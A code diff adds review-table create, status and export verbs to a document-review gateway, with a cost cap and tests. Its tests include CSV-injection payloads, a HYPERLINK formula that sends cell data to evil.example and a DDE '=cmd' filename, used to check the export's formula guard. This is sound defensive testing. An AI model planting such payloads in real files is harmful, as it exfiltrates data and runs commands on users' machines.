@@ -1440,6 +1440,173 @@ def _citation_get(args: dict, ctx: Context) -> dict:
                              "rest on it, whatever the stored envelope says.")}
     return _refuse("NOT_FOUND", f"no citation {cid!r} in conversation {conv_id!r}")
 
+# ── H4: review tables ────────────────────────────────────────────────────────
+#
+# The verbs are `review_table.*` because that is what a user calls it; the code is
+# `review_grid` because `checker/review_table.py` is an older, unrelated module. One
+# feature, three names, written down in docs/START_HERE.md §5.
+
+# Every cell is a RUN (gateway/jobs.py refuses two jobs for one run), so a grid is a
+# multiplier on the queue and on the bill: 40 documents x 6 columns is 240 runs. The cap is
+# a declared number rather than a judgement at call time, and it is checked BEFORE anything
+# is enqueued -- a half-enqueued grid is the worst outcome, because the user is billed for
+# the part that ran and has no table.
+MAX_GRID_CELLS = 500
+
+
+def _review_table_create(args: dict, ctx: Context) -> dict:
+    """Define a grid and enqueue one job per cell. Refuses above the cell cap.
+
+    A WRITE verb: it creates a grid and queues work, so `mcp_tools()` keeps it off MCP.
+    """
+    import uuid
+    from agents import review_grid as rgr
+    from checker import review_grid as rg
+
+    name = (args.get("name") or "").strip()
+    if not name:
+        return _refuse("BAD_REQUEST", "a review table needs a name")
+    raw_docs = args.get("document_ids") or []
+    raw_cols = args.get("columns") or []
+    if not isinstance(raw_docs, list) or not all(isinstance(d, str) for d in raw_docs):
+        return _refuse("BAD_REQUEST", "document_ids must be a list of strings")
+    if not isinstance(raw_cols, list):
+        return _refuse("BAD_REQUEST", "columns must be a list of objects")
+    if not raw_docs:
+        return _refuse("BAD_REQUEST", "a review table needs at least one document")
+    if not raw_cols:
+        return _refuse("BAD_REQUEST",
+                       "a review table with no columns asks nothing of its documents")
+
+    try:
+        columns = tuple(rg.Column(str(c.get("name") or ""), str(c.get("kind") or ""),
+                                  str(c.get("question") or ""))
+                        for c in raw_cols if isinstance(c, dict))
+    except rg.TableError as e:
+        return _refuse("BAD_REQUEST", str(e))
+    if len(columns) != len(raw_cols):
+        return _refuse("BAD_REQUEST", "every column must be an object")
+
+    # ── the cost guard, before anything is enqueued ──────────────────────────
+    cells = len(raw_docs) * len(columns)
+    if cells > MAX_GRID_CELLS:
+        return _refuse("GRID_TOO_LARGE",
+                       f"{len(raw_docs)} document(s) x {len(columns)} column(s) = "
+                       f"{cells} cells, and the cap is {MAX_GRID_CELLS}. Every cell is a "
+                       f"separate run and a separate model call, so this is a bill and a "
+                       f"queue depth, not just a big table. Narrow the documents or the "
+                       f"columns, or raise the cap deliberately.")
+    ledger = _ledger()
+    if ledger is not None:
+        verdict = ledger.can_make_call()
+        if not verdict.allowed:
+            # Checked BEFORE the first enqueue. A grid that half-runs bills the user for
+            # the part that ran and leaves them without a table.
+            return _refuse("NO_BUDGET",
+                           f"{verdict.reason} No cell was enqueued, so nothing was spent "
+                           f"on this table.")
+
+    store = ctx.store
+    if store is None:
+        return _refuse("NO_STORE",
+                       "a review table is durable work: it needs a store, and returning "
+                       "one that vanishes on restart would be a lie about what was saved")
+    grid_id = (args.get("grid_id") or "").strip() or str(uuid.uuid4())
+    table = rg.Table(grid_id, name, columns, tuple(raw_docs))
+    store.write_grid({"grid_id": grid_id, "name": name,
+                      "columns": [{"name": c.name, "kind": c.kind,
+                                   "question": c.question} for c in columns],
+                      "document_ids": list(raw_docs)})
+
+    sched = rgr.Scheduled(grid_id)
+    if ctx.queue is not None:
+        sched = rgr.schedule(table, queue=ctx.queue)
+    out = {"grid_id": grid_id, "name": name, "cells": cells,
+           "documents": len(raw_docs), "columns": len(columns),
+           "scheduled": sched.to_dict(),
+           "cap": MAX_GRID_CELLS,
+           # UNPRICED stays UNPRICED: a grid's cost is the sum of calls that have not
+           # happened, and a number here would be an estimate presented as a price. The
+           # per-call ledger prices each cell when it runs.
+           "estimated_cost_inr": None,
+           "cost_note": ("UNPRICED: every cell is a separate model call and none has run "
+                         "yet. The ledger prices each one as it happens; a figure here "
+                         "would be a guess wearing a currency symbol."),
+           "note": ("One run per cell. Poll review_table.status; nothing is answered until "
+                    "a worker has run it, and a PENDING cell is not a NOT_FOUND one.")}
+    return out
+
+
+def _review_table_status(args: dict, ctx: Context) -> dict:
+    """The grid, its per-state counts and whether it is complete. Read-only."""
+    from agents import review_grid as rgr
+
+    if ctx.store is None:
+        return _refuse("NO_STORE", "no store is configured")
+    grid_id = (args.get("grid_id") or "").strip()
+    if not grid_id:
+        return _refuse("BAD_REQUEST", "grid_id is required")
+    table, cancelled = _load_grid(ctx, grid_id)
+    if table is None:
+        return _refuse("NOT_FOUND", f"no review table {grid_id!r} for this tenant")
+    out = rgr.status(table, cancelled=cancelled)
+    out["cells_detail"] = [table.cell(d, c.name).to_dict()
+                           if hasattr(table.cell(d, c.name), "to_dict")
+                           else {"document_id": d, "column": c.name,
+                                 "state": table.cell(d, c.name).state,
+                                 "value": table.cell(d, c.name).value,
+                                 "quote": table.cell(d, c.name).quote,
+                                 "reason": table.cell(d, c.name).reason}
+                           for d in table.document_ids for c in table.columns]
+    return out
+
+
+def _review_table_export(args: dict, ctx: Context) -> dict:
+    """The grid as CSV. Every cell non-empty, and none of them able to run as a formula."""
+    from checker import review_grid as rg
+
+    if ctx.store is None:
+        return _refuse("NO_STORE", "no store is configured")
+    grid_id = (args.get("grid_id") or "").strip()
+    if not grid_id:
+        return _refuse("BAD_REQUEST", "grid_id is required")
+    table, cancelled = _load_grid(ctx, grid_id)
+    if table is None:
+        return _refuse("NOT_FOUND", f"no review table {grid_id!r} for this tenant")
+    names = {d: str((ctx.documents.get(d) or {}).get("name") or d)
+             for d in table.document_ids}
+    t = table.tally()
+    return {"grid_id": grid_id, "filename": f"{table.name[:40] or 'review-table'}.csv",
+            "content_type": "text/csv",
+            "csv": rg.to_csv(table, names=names),
+            "complete": table.complete, "cancelled": cancelled,
+            "findings": t["findings"], "cells": t["cells"],
+            "note": ("Every cell carries words, never a blank: NOT FOUND, NEEDS LAWYER, "
+                     "PENDING and COULD NOT RUN each read differently, because a blank "
+                     "makes 'the clause is absent' and 'we did not read it' identical. "
+                     "Values beginning = + - @ are prefixed with a single quote so the "
+                     "file cannot run as a formula in a spreadsheet.")}
+
+
+def _load_grid(ctx: Context, grid_id: str):
+    """(Table, cancelled) from the store, or (None, False)."""
+    from checker import review_grid as rg
+
+    row = ctx.store.read_grid(grid_id)
+    if row is None:
+        return None, False
+    columns = tuple(rg.Column(c["name"], c["kind"], c["question"])
+                    for c in row.get("columns") or ())
+    cells = []
+    for c in ctx.store.read_grid_cells(grid_id):
+        cells.append(rg.Cell(document_id=c["document_id"], column=c["column_name"],
+                             state=c["state"], value=c.get("value") or "",
+                             quote=c.get("quote") or "", reason=c.get("reason") or ""))
+    table = rg.Table(grid_id, row.get("name") or "", columns,
+                     tuple(row.get("document_ids") or ()), tuple(cells))
+    return table, bool(row.get("cancelled_at"))
+
+
 def _documents_upload(args: dict, ctx: Context) -> dict:
     """Store bytes under their own sha256. The identity IS the hash, not a counter.
 
@@ -1777,6 +1944,32 @@ VERBS: tuple[Verb, ...] = (
                           "the read")),
          "POST", read_only=True, run=_citation_get),
 
+    Verb("review_table.create",
+         "Define a review table -- documents down the side, questions across the top -- "
+         "and queue one job per cell. Refuses above the cell cap, and checks the budget "
+         "before anything is enqueued.",
+         (Field("name", STRING, True, describes="a name for the table"),
+          Field("document_ids", ARRAY, True,
+                describes="sha256 ids from documents.upload"),
+          Field("columns", ARRAY, True,
+                describes="[{name, kind, question}]; kind is text|date|amount|yes_no|"
+                          "clause, and question is what is asked of each document"),
+          Field("grid_id", STRING, False,
+                describes="supply one to make creation idempotent")),
+         "POST", read_only=False, run=_review_table_create),
+
+    Verb("review_table.status",
+         "One review table: per-state counts, every cell, and whether it is complete. "
+         "PENDING and COULD NOT RUN are not findings.",
+         (Field("grid_id", STRING, True, describes="the table"),),
+         "POST", read_only=True, run=_review_table_status),
+
+    Verb("review_table.export",
+         "The table as CSV. Every cell carries words rather than a blank, and any value a "
+         "spreadsheet would run as a formula is quoted.",
+         (Field("grid_id", STRING, True, describes="the table"),),
+         "POST", read_only=True, run=_review_table_export),
+
     Verb("documents.upload",
          "Store a document and return the sha256 that identifies it.",
          (Field("text", STRING, False, describes="the document text"),
@@ -1863,8 +2056,9 @@ def _test() -> None:
                     "runs.submit", "runs.cancel", "documents.upload",
                     "sources.list", "sources.search", "company_facts.extract",
                     "intake.classify", "conversation.send", "conversation.list",
-                    "conversation.get", "citation.get"},
-          f"the nineteen verbs are declared once ({sorted(names)})")
+                    "conversation.get", "citation.get", "review_table.create",
+                    "review_table.status", "review_table.export"},
+          f"the twenty-two verbs are declared once ({sorted(names)})")
     # sources.* are READ-ONLY, so they reach MCP. That is the intended shape: an agent may
     # ask what a source permits and search what may be read, and there is no sources verb
     # that fetches, stores or spends. S3's Indian Kanoon connector will spend money, and
@@ -1876,8 +2070,9 @@ def _test() -> None:
     # to this line. All five are kept out of MCP by mcp_tools() for the same reason: a tool
     # surface that can submit, cancel or approve is one that can act with nobody present.
     check(set(write_verbs()) == {"documents.upload", "runs.approve", "runs.reject",
-                                 "runs.submit", "runs.cancel", "conversation.send"},
-          f"...and exactly six of them write ({sorted(write_verbs())})")
+                                 "runs.submit", "runs.cancel", "conversation.send",
+                                 "review_table.create"},
+          f"...and exactly seven of them write ({sorted(write_verbs())})")
     check(f"{MCP_NAMESPACE}.conversation.send" not in {t.name for t in mcp},
           "conversation.send WRITES -- it creates a thread, appends messages and may "
           "enqueue work -- so mcp_tools() keeps it off MCP, by rule and not by the author "
@@ -2349,6 +2544,142 @@ def _test() -> None:
     check("nothing may rest on it" in _cg2["note"],
           "...and the note says what that means")
 
+    # ══ H4: review_table.create / .status / .export ══════════════════════════
+    from checker import review_grid as _rg
+    from gateway.jobs import MemoryQueue as _MQ2
+    _hctx = Context(store=_MB(), queue=_MQ2(),
+                    clock=lambda: "2026-10-01T00:00:00+00:00")
+    _hV = by_name()
+    _d1 = _hV["documents.upload"].run(
+        {"text": "MUTUAL NDA\n3. Governed by the laws of India.\n", "name": "nda.txt"},
+        _hctx)["document_id"]
+    _d2 = _hV["documents.upload"].run(
+        {"text": "SUPPLY AGREEMENT with no governing law clause.\n", "name": "supply.txt"},
+        _hctx)["document_id"]
+    _cols = [{"name": "governing law", "kind": "text", "question": "Which law governs?"},
+             {"name": "term end", "kind": "date", "question": "When does it expire?"}]
+
+    # write verbs stay off MCP
+    for _wv in ("review_table.create",):
+        check(_wv in write_verbs() and f"{MCP_NAMESPACE}.{_wv}" not in {t.name for t in mcp},
+              f"{_wv} WRITES and is kept off MCP by mcp_tools()")
+    for _rv in ("review_table.status", "review_table.export"):
+        check(_rv not in write_verbs()
+              and f"{MCP_NAMESPACE}.{_rv}" in {t.name for t in mcp},
+              f"{_rv} is read-only and reaches MCP")
+
+    _cr = _hV["review_table.create"].run(
+        {"name": "NDA diligence", "document_ids": [_d1, _d2], "columns": _cols}, _hctx)
+    check(_cr.get("cells") == 4 and len(_cr["scheduled"]["enqueued"]) == 4,
+          f"create materialises 4 cells and enqueues one job per cell ({_cr.get('cells')})")
+    check(_cr["estimated_cost_inr"] is None and "UNPRICED" in _cr["cost_note"],
+          "...and the cost is UNPRICED, not a number: every cell is a call that has not "
+          "happened, and a figure would be a guess wearing a currency symbol")
+    _gid = _cr["grid_id"]
+
+    # ── the cost guard, before anything is enqueued ─────────────────────────
+    _big = _hV["review_table.create"].run(
+        {"name": "too big", "document_ids": [("%064x" % i) for i in range(101)],
+         "columns": _cols * 3}, _hctx)
+    check(_big.get("code") == "GRID_TOO_LARGE",
+          f"a grid above the cap is REFUSED ({_big.get('code')})")
+    check("606 cells" in _big["detail"] and str(MAX_GRID_CELLS) in _big["detail"],
+          f"...and the refusal names the CELL COUNT and the CAP ({_big['detail'][:70]})")
+    check("separate run" in _big["detail"] or "separate model call" in _big["detail"],
+          "...and says why a big table is a bill and a queue depth, not just a big table")
+    _before = len(_MQ2().__dict__.get("jobs", []) or [])
+    _q3 = _MQ2()
+    _hctx3 = Context(store=_MB(), queue=_q3, clock=lambda: "2026-10-01T00:00:00+00:00")
+    _hV["review_table.create"].run(
+        {"name": "too big", "document_ids": [("%064x" % i) for i in range(101)],
+         "columns": _cols * 3}, _hctx3)
+    check(_hctx3.store.read_grid_cells("x") == [] and not getattr(_q3, "jobs", []),
+          "...and NOTHING was enqueued: a half-enqueued grid bills the user for the part "
+          "that ran and leaves them without a table")
+    check(MAX_GRID_CELLS == 500, f"the cap is a declared number ({MAX_GRID_CELLS})")
+    _exact = _hV["review_table.create"].run(
+        {"name": "at the cap", "document_ids": [("%064x" % i) for i in range(250)],
+         "columns": _cols}, Context(store=_MB(), queue=_MQ2()))
+    check(_exact.get("cells") == 500, f"a grid exactly AT the cap is allowed ({_exact.get('cells')})")
+
+    # ── bad input ───────────────────────────────────────────────────────────
+    for _bad, _why in (({"name": "", "document_ids": [_d1], "columns": _cols}, "no name"),
+                       ({"name": "n", "document_ids": [], "columns": _cols}, "no documents"),
+                       ({"name": "n", "document_ids": [_d1], "columns": []}, "no columns"),
+                       ({"name": "n", "document_ids": [_d1],
+                         "columns": [{"name": "c", "kind": "colour", "question": "q?"}]},
+                        "an unknown column kind"),
+                       ({"name": "n", "document_ids": [_d1],
+                         "columns": [{"name": "c", "kind": "text", "question": ""}]},
+                        "a column with no question")):
+        _r = _hV["review_table.create"].run(_bad, Context(store=_MB(), queue=_MQ2()))
+        check(_r.get("status") == "REFUSED", f"create refuses {_why} ({_r.get('code')})")
+    check(_hV["review_table.create"].run(
+              {"name": "n", "document_ids": [_d1], "columns": _cols},
+              Context())["code"] == "NO_STORE",
+          "create with no store is refused: a review table is durable work")
+
+    # ── status: PENDING is not a finding ────────────────────────────────────
+    _st = _hV["review_table.status"].run({"grid_id": _gid}, _hctx)
+    check(_st["cells"] == 4 and _st["findings"] == 0 and not _st["complete"],
+          f"a fresh grid has 4 cells and 0 FINDINGS ({_st['findings']}/{_st['cells']})")
+    check(_st["by_state"]["PENDING"] == 4, "...all four PENDING")
+    check(len(_st["cells_detail"]) == 4, "...and every cell is listed")
+    check(_hV["review_table.status"].run({"grid_id": "nope"}, _hctx)["code"] == "NOT_FOUND",
+          "an unknown grid is NOT_FOUND, never an empty table")
+
+    # Answer two cells, one FOUND and one NOT_FOUND.
+    _hctx.store.write_grid_cell({"grid_id": _gid, "document_id": _d1,
+                                 "column_name": "governing law", "state": "FOUND",
+                                 "value": "India",
+                                 "quote": "Governed by the laws of India"})
+    _hctx.store.write_grid_cell({"grid_id": _gid, "document_id": _d2,
+                                 "column_name": "governing law", "state": "NOT_FOUND",
+                                 "reason": "the agreement names no governing law at all"})
+    _st2 = _hV["review_table.status"].run({"grid_id": _gid}, _hctx)
+    check(_st2["findings"] == 2 and _st2["by_state"]["PENDING"] == 2,
+          f"two answers are two findings; the unrun cells stay PENDING ({_st2['findings']})")
+
+    # ── export: words in every cell, and no formula can run ────────────────
+    _ex = _hV["review_table.export"].run({"grid_id": _gid}, _hctx)
+    import csv as _csv, io as _io
+    _rows = [r for r in _csv.reader(_io.StringIO(_ex["csv"]))]
+    check(_rows[0] == ["document", "governing law", "term end"],
+          f"the header is the document plus each column ({_rows[0]})")
+    check(any("nda.txt" in r[0] for r in _rows[1:]),
+          "a document renders by NAME, not by its sha256")
+    _empty = [(i, j) for i, r in enumerate(_rows[1:], 1)
+              for j, v in enumerate(r) if not str(v).strip()]
+    check(not _empty, f"no exported cell is empty ({_empty})")
+    check("NOT FOUND" in _ex["csv"] and "PENDING" in _ex["csv"],
+          "...and NOT FOUND and PENDING read differently")
+    check(_ex["filename"].endswith(".csv") and _ex["content_type"] == "text/csv",
+          f"the export names a filename and a content type ({_ex['filename']})")
+    check(_ex["findings"] == 2 and _ex["cells"] == 4,
+          "...and reports findings separately from cells")
+
+    # CSV injection, end to end through the verb.
+    _evil = _hV["documents.upload"].run(
+        {"text": "NDA\n=HYPERLINK(\"http://evil.example/?\"&A1,\"x\") governs.\n",
+         "name": "=cmd|'/c calc'!A1.docx"}, _hctx)["document_id"]
+    _eg = _hV["review_table.create"].run(
+        {"name": "evil", "document_ids": [_evil],
+         "columns": [{"name": "governing law", "kind": "text",
+                      "question": "Which law governs?"}]}, _hctx)["grid_id"]
+    _hctx.store.write_grid_cell(
+        {"grid_id": _eg, "document_id": _evil, "column_name": "governing law",
+         "state": "FOUND", "value": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\")",
+         "quote": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\") governs"})
+    _ec = _hV["review_table.export"].run({"grid_id": _eg}, _hctx)["csv"]
+    check(not any(v.startswith(("=", "+", "@")) for r in _csv.reader(_io.StringIO(_ec))
+                  for v in r),
+          "no exported value can run as a formula -- the cell value AND the filename are "
+          "both guarded")
+    check("'=HYPERLINK" in _ec, "...the guard is a single leading quote, verbatim after it")
+    check(_rg.csv_safe("-50000") == "'-50000",
+          "a negative amount is guarded too, and exports as text -- a number that reads "
+          "oddly beats an export that runs")
+
     # ── PARITY, the point of the file ───────────────────────────────────────
     check(set(rest) == names and set(cli) == names,
           f"REST and CLI expose every verb (rest {sorted(set(rest) ^ names)}, "
@@ -2409,7 +2740,7 @@ def _test() -> None:
           "...while a WRITE verb is kept out of MCP by mcp_tools(), not by the author "
           "remembering to")
     check("widgets.delete" in write_verbs(hypo), "...and is named in write_verbs()")
-    check(len(VERBS) == 19 and "widgets.count" not in rest_spec(),
+    check(len(VERBS) == 22 and "widgets.count" not in rest_spec(),
           "...and the probe changed nothing in this module: the surfaces are generated "
           "from an argument, not from a global the test rebound")
 
